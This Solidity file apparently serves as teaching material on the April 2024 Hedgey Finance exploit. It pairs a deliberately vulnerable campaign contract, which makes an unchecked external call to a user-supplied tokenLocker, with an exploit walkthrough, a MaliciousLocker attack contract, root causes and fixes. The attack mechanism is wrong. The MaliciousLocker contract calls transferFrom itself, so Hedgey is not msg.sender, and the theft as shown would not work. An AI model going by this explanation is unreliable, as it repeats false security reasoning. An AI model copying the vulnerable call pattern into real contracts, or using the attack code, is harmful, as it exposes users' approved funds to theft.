/*LN-1*/ // SPDX-License-Identifier: MIT
/*LN-2*/ pragma solidity ^0.8.0;
/*LN-3*/ 
/*LN-4*/ /**
/*LN-5*/  * HEDGEY FINANCE EXPLOIT (April 2024)
/*LN-6*/  * Loss: $44.7 million
/*LN-7*/  * Attack: Arbitrary External Call via Token Locker Donation
/*LN-8*/  *
/*LN-9*/  * Hedgey Finance manages token vesting and claims. The createLockedCampaign
/*LN-10*/  * function accepted a user-controlled tokenLocker address in the donation
/*LN-11*/  * parameter. This address was then used in an external call that allowed
/*LN-12*/  * attackers to call transferFrom on any token where users had approvals.
/*LN-13*/  */
/*LN-14*/ 
/*LN-15*/ interface IERC20 {
/*LN-16*/     function transfer(address to, uint256 amount) external returns (bool);
/*LN-17*/ 
/*LN-18*/     function transferFrom(
/*LN-19*/         address from,
/*LN-20*/         address to,
/*LN-21*/         uint256 amount
/*LN-22*/     ) external returns (bool);
/*LN-23*/ 
/*LN-24*/     function balanceOf(address account) external view returns (uint256);
/*LN-25*/ 
/*LN-26*/     function approve(address spender, uint256 amount) external returns (bool);
/*LN-27*/ }
/*LN-28*/ 
/*LN-29*/ enum TokenLockup {
/*LN-30*/     Unlocked,
/*LN-31*/     Locked,
/*LN-32*/     Vesting
/*LN-33*/ }
/*LN-34*/ 
/*LN-35*/ struct Campaign {
/*LN-36*/     address manager;
/*LN-37*/     address token;
/*LN-38*/     uint256 amount;
/*LN-39*/     uint256 end;
/*LN-40*/     TokenLockup tokenLockup;
/*LN-41*/     bytes32 root;
/*LN-42*/ }
/*LN-43*/ 
/*LN-44*/ struct ClaimLockup {
/*LN-45*/     address tokenLocker;
/*LN-46*/     uint256 start;
/*LN-47*/     uint256 cliff;
/*LN-48*/     uint256 period;
/*LN-49*/     uint256 periods;
/*LN-50*/ }
/*LN-51*/ 
/*LN-52*/ struct Donation {
/*LN-53*/     address tokenLocker;
/*LN-54*/     uint256 amount;
/*LN-55*/     uint256 rate;
/*LN-56*/     uint256 start;
/*LN-57*/     uint256 cliff;
/*LN-58*/     uint256 period;
/*LN-59*/ }
/*LN-60*/ 
/*LN-61*/ contract HedgeyClaimCampaigns {
/*LN-62*/     mapping(bytes16 => Campaign) public campaigns;
/*LN-63*/ 
/*LN-64*/     /**
/*LN-65*/      * @notice Create a locked campaign with vesting
/*LN-66*/      * @dev VULNERABILITY: User-controlled tokenLocker address in donation
/*LN-67*/      */
/*LN-68*/     function createLockedCampaign(
/*LN-69*/         bytes16 id,
/*LN-70*/         Campaign memory campaign,
/*LN-71*/         ClaimLockup memory claimLockup,
/*LN-72*/         Donation memory donation
/*LN-73*/     ) external {
/*LN-74*/         require(campaigns[id].manager == address(0), "Campaign exists");
/*LN-75*/ 
/*LN-76*/         campaigns[id] = campaign;
/*LN-77*/ 
/*LN-78*/         if (donation.amount > 0 && donation.tokenLocker != address(0)) {
/*LN-79*/             // VULNERABILITY 1: User-controlled tokenLocker address
/*LN-80*/             // Attacker can specify malicious contract address
/*LN-81*/ 
/*LN-82*/             // VULNERABILITY 2: Arbitrary external call to user-controlled address
/*LN-83*/             // Makes call to donation.tokenLocker without validation
/*LN-84*/             (bool success, ) = donation.tokenLocker.call(
/*LN-85*/                 abi.encodeWithSignature(
/*LN-86*/                     "createTokenLock(address,uint256,uint256,uint256,uint256,uint256)",
/*LN-87*/                     campaign.token,
/*LN-88*/                     donation.amount,
/*LN-89*/                     donation.start,
/*LN-90*/                     donation.cliff,
/*LN-91*/                     donation.rate,
/*LN-92*/                     donation.period
/*LN-93*/                 )
/*LN-94*/             );
/*LN-95*/ 
/*LN-96*/             // VULNERABILITY 3: Assumed success means tokens were locked
/*LN-97*/             // But malicious contract can do anything, including token theft
/*LN-98*/             require(success, "Token lock failed");
/*LN-99*/         }
/*LN-100*/     }
/*LN-101*/ 
/*LN-102*/     /**
/*LN-103*/      * @notice Cancel a campaign
/*LN-104*/      */
/*LN-105*/     function cancelCampaign(bytes16 campaignId) external {
/*LN-106*/         require(campaigns[campaignId].manager == msg.sender, "Not manager");
/*LN-107*/         delete campaigns[campaignId];
/*LN-108*/     }
/*LN-109*/ }
/*LN-110*/ 
/*LN-111*/ /**
/*LN-112*/  * EXPLOIT SCENARIO:
/*LN-113*/  *
/*LN-114*/  * 1. Attacker creates malicious "tokenLocker" contract:
/*LN-115*/  *    - Implements createTokenLock() interface
/*LN-116*/  *    - But instead of locking tokens, calls transferFrom() on victims
/*LN-117*/  *    - Contract address: 0x[attacker_contract]
/*LN-118*/  *
/*LN-119*/  * 2. Attacker identifies victims with token approvals:
/*LN-120*/  *    - Users who approved Hedgey for USDC transfers
/*LN-121*/  *    - Many users had unlimited approvals
/*LN-122*/  *    - Target victims with large USDC balances
/*LN-123*/  *
/*LN-124*/  * 3. Attacker borrows USDC via flashloan:
/*LN-125*/  *    - Borrows 1.305M USDC from Balancer
/*LN-126*/  *    - Uses as campaign.amount in call
/*LN-127*/  *
/*LN-128*/  * 4. Attacker calls createLockedCampaign():
/*LN-129*/  *    - Sets donation.tokenLocker = malicious contract address
/*LN-130*/  *    - Sets donation.amount = flashloan amount
/*LN-131*/  *    - Campaign.token = USDC address
/*LN-132*/  *
/*LN-133*/  * 5. Hedgey calls malicious tokenLocker:
/*LN-134*/  *    - Calls attackerContract.createTokenLock()
/*LN-135*/  *    - msg.sender is Hedgey contract
/*LN-136*/  *
/*LN-137*/  * 6. Malicious contract executes token theft:
/*LN-138*/  *    - Instead of locking tokens, calls:
/*LN-139*/  *      USDC.transferFrom(victim, attacker, victimBalance)
/*LN-140*/  *    - Transfer succeeds because victim approved Hedgey
/*LN-141*/  *    - Hedgey is msg.sender, so has approval rights
/*LN-142*/  *
/*LN-143*/  * 7. Repeat for multiple victims:
/*LN-144*/  *    - Drain $44.7M total from many users
/*LN-145*/  *    - Each user who had approved Hedgey is vulnerable
/*LN-146*/  *
/*LN-147*/  * 8. Repay flashloan and profit:
/*LN-148*/  *    - Return borrowed USDC
/*LN-149*/  *    - Keep stolen funds
/*LN-150*/  *
/*LN-151*/  * Malicious Contract Implementation:
/*LN-152*/  * ```solidity
/*LN-153*/  * contract MaliciousLocker {
/*LN-154*/  *     function createTokenLock(
/*LN-155*/  *         address token,
/*LN-156*/  *         uint256 amount,
/*LN-157*/  *         uint256 start,
/*LN-158*/  *         uint256 cliff,
/*LN-159*/  *         uint256 rate,
/*LN-160*/  *         uint256 period
/*LN-161*/  *     ) external {
/*LN-162*/  *         // msg.sender is Hedgey contract with victim approvals
/*LN-163*/  *         IERC20 tokenContract = IERC20(token);
/*LN-164*/  *         address victim = 0x[victim_address];
/*LN-165*/  *         uint256 victimBalance = tokenContract.balanceOf(victim);
/*LN-166*/  *
/*LN-167*/  *         // Steal victim's tokens using Hedgey's approval rights
/*LN-168*/  *         tokenContract.transferFrom(victim, tx.origin, victimBalance);
/*LN-169*/  *     }
/*LN-170*/  * }
/*LN-171*/  * ```
/*LN-172*/  *
/*LN-173*/  * Root Causes:
/*LN-174*/  * - User-controlled address used in external call
/*LN-175*/  * - No whitelist of approved tokenLocker contracts
/*LN-176*/  * - Arbitrary external call without validation
/*LN-177*/  * - Trusting return value without verifying behavior
/*LN-178*/  * - Users gave unlimited approvals to Hedgey
/*LN-179*/  * - No validation of tokenLocker contract code
/*LN-180*/  * - Missing access controls on who can create campaigns
/*LN-181*/  *
/*LN-182*/  * Fix:
/*LN-183*/  * - Whitelist approved tokenLocker contract addresses
/*LN-184*/  * - Never make external calls to user-provided addresses
/*LN-185*/  * - Implement contract code verification
/*LN-186*/  * - Require tokenLocker contracts to be verified/audited
/*LN-187*/  * - Use proxy pattern with upgradeable approved lockers
/*LN-188*/  * - Implement approval scoping (Permit2 pattern)
/*LN-189*/  * - Add maximum approval amounts
/*LN-190*/  * - Monitor for unusual transferFrom patterns
/*LN-191*/  * - Implement pause mechanism for suspicious activity
/*LN-192*/  */
/*LN-193*/ 